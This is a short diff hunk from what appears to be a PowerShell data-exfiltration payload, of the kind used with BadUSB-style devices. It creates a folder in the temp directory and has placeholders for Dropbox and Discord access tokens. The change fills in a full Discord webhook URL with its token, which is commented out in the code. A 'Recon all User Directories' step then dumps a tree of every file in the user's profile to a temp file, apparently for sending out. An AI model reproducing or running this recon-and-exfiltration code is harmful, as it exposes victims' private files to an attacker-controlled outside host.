@@ -11,7 +11,7 @@ New-Item -Path $env:tmp\$FolderName -ItemType Directory | Out-Null
 
 # Enter your access tokens below
 #$db = ""
-#$dc = ""
+#$dc = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
 
 # Recon all User Directories
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
